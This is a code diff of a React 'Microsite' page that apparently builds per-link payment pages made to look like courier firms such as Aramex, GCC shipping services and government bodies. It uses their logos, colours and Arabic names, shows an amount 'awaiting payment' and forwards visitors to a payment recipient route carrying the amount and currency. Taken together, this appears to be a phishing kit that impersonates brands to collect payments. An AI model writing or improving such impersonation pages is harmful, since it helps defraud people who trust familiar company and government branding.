@@ -4,10 +4,11 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { useLink } from "@/hooks/useSupabase";
+import { useLinkData } from "@/hooks/useLinkData";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovBranding } from "@/lib/brandingSystem";
 import { gccShippingServices } from "@/lib/gccShippingServices";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency } from "@/utils/countryData";
@@ -32,7 +33,7 @@ import {
 const Microsite = () => {
   const { country, type, id } = useParams();
   const navigate = useNavigate();
-  const { data: link, isLoading, isError } = useLink(id);
+  const { data: link, isLoading, isError } = useLinkData(id);
   const countryData = getCountryByCode(country || "");
   const [showPage, setShowPage] = useState(false);
 
@@ -93,13 +94,13 @@ const Microsite = () => {
   const isLogistics = link.type === 'logistics';
   const isContracts = link.type === 'contracts';
   const isChalet = link.type === 'chalet';
-  const isGovernment = link.type === 'government';
 
   // Get service branding for SEO and display
   const serviceName = payload.service_name || payload.chalet_name;
-  const serviceKey = payload.service_key || 'aramex';
+  const serviceKey = payload.service_key || (link.type === 'contracts' ? 'contracts' : 'aramex');
+  const govId = payload.govId;
   const serviceBranding = getServiceBranding(serviceKey);
-  const govBranding = isGovernment ? getGovBranding(payload.govId || country || 'SA') : undefined;
+  const govBranding = govId ? getGovBranding(govId) : undefined;
 
   // Get dynamic company metadata for OG tags
   const companyMeta = getCompanyMeta(serviceKey);
@@ -151,9 +152,10 @@ const Microsite = () => {
     : isContracts
     ? `${payload.template_name} - ${payload.template_category}`
     : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;
-  const seoImage = isGovernment ? (govBranding?.logo) : (companyMeta.image || serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg');
-  const primaryColor = isGovernment ? (govBranding?.colors.primary) : (countryData.primaryColor);
-  const secondaryColor = isGovernment ? (govBranding?.colors.secondary) : (countryData.secondaryColor);
+  const seoImage = govBranding?.logoUrl || companyMeta.image || serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
+
+  const primaryColor = govBranding?.colors.primary || countryData.primaryColor;
+  const secondaryColor = govBranding?.colors.secondary || countryData.secondaryColor;
 
   return (
     <>
@@ -185,11 +187,11 @@ const Microsite = () => {
 
           {/* Main Card */}
           <Card className="overflow-hidden shadow-elevated">
-            {/* Header with Branding Colors */}
+            {/* Header with Country Colors */}
             <div
               className="h-32 relative"
               style={{
-                background: isGovernment && govBranding ? govBranding.gradients.header : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+                background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
               }}
             >
               <div className="absolute inset-0 bg-black/20" />
@@ -198,16 +200,14 @@ const Microsite = () => {
                   {isInvoice
                     ? `فاتورة ${payload.invoice_number}`
                     : isHealth
-                    ? (payload.service_name || 'خدمة صحية')
+                    ? (payload.service_name || payload.service_type_label)
                     : isLogistics
-                    ? (payload.service_name || 'خدمة لوجستية')
+                    ? (payload.service_name || payload.service_type_label)
                     : isContracts
-                    ? (payload.template_name || 'عقد إلكتروني')
-                    : isGovernment
-                    ? (payload.service_name || 'سداد حكومي')
-                    : payload.chalet_name}
+                    ? payload.template_name
+                    : (govBranding?.nameAr || payload.service_name || payload.chalet_name)}
                 </h1>
-                <p className="text-lg opacity-90">{isGovernment && govBranding ? govBranding.nameAr : countryData.nameAr}</p>
+                <p className="text-lg opacity-90">{govBranding?.nameAr || countryData.nameAr}</p>
               </div>
             </div>
 
@@ -215,12 +215,8 @@ const Microsite = () => {
             <div className="p-8">
               {/* Company Logo/Icon */}
               <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center p-4">
-                {isGovernment && govBranding ? (
-                  <img
-                    src={govBranding.logo}
-                    alt={serviceName}
-                    className="max-h-full max-w-full object-contain"
-                  />
+                {govBranding?.logoUrl ? (
+                   <img src={govBranding.logoUrl} alt="" className="max-h-full max-w-full object-contain" />
                 ) : isShipping && serviceBranding.logo ? (
                   <img
                     src={serviceBranding.logo}
@@ -270,40 +266,6 @@ const Microsite = () => {
 
               {/* Details Grid */}
               <div className="grid md:grid-cols-2 gap-6 mb-8">
-                {isGovernment && (
-                  <>
-                    <div className="flex items-start gap-3">
-                      <Landmark className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">الجهة الحكومية</p>
-                        <p className="text-muted-foreground text-sm">{payload.service_name}</p>
-                      </div>
-                    </div>
-                    <div className="flex items-start gap-3">
-                      <User className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">المستفيد</p>
-                        <p className="text-muted-foreground text-sm">{payload.customerInfo?.fullName}</p>
-                      </div>
-                    </div>
-                    {payload.reference && (
-                      <div className="flex items-start gap-3">
-                        <Hash className="w-5 h-5 text-primary mt-1" />
-                        <div>
-                          <p className="font-semibold mb-1">رقم المرجع</p>
-                          <p className="text-muted-foreground text-sm">{payload.reference}</p>
-                        </div>
-                      </div>
-                    )}
-                    <div className="flex items-start gap-3">
-                      <Shield className="w-5 h-5 text-primary mt-1" />
-                      <div>
-                        <p className="font-semibold mb-1">حالة الطلب</p>
-                        <p className="text-green-600 text-sm font-bold">بانتظار السداد</p>
-                      </div>
-                    </div>
-                  </>
-                )}
                 {isInvoice ? (
                   <>
                     <div className="flex items-start gap-3">
@@ -538,10 +500,12 @@ const Microsite = () => {
                   {isInvoice ? 'إجمالي الفاتورة' : isHealth ? 'رسوم الحجز' : isLogistics ? 'تكلفة الشحن' : isContracts ? 'قيمة العقد' : 'المبلغ الإجمالي'}
                 </p>
                 <p className="text-5xl font-bold mb-2">
-                  {isShipping || isGovernment || isHealth || isLogistics || isChalet
+                  {isShipping
                     ? formatCurrency(amount, getCurrencyCode(country || "SA"))
                     : isInvoice
                     ? formatCurrency(payload.total, getCurrencyCode(country || "SA"))
+                    : isLogistics
+                    ? formatCurrency(parseFloat(payload.insurance_value) || 0, getCurrencyCode(country || "SA"))
                     : isContracts
                     ? 'مجاناً'
                     : formatCurrency(payload.total_amount, getCurrencyCode(country || "SA"))}
@@ -630,9 +594,11 @@ const Microsite = () => {
                 onClick={() => {
                   const companyKey = payload.service_key || 'aramex';
                   const govId = payload.govId;
-                  const query = new URLSearchParams();
-                  if (isGovernment && govId) query.set('govId', govId);
-                  else query.set('company', companyKey);
+                  const query = new URLSearchParams(window.location.search);
+                  if (govId) query.set('govId', govId);
+                  query.set('company', companyKey);
+                  query.set('amount', amount.toString());
+                  query.set('currency', getCurrencyCode(country || "SA"));
 
                   navigate(`/pay/${link.id}/recipient?${query.toString()}`);
                 }}
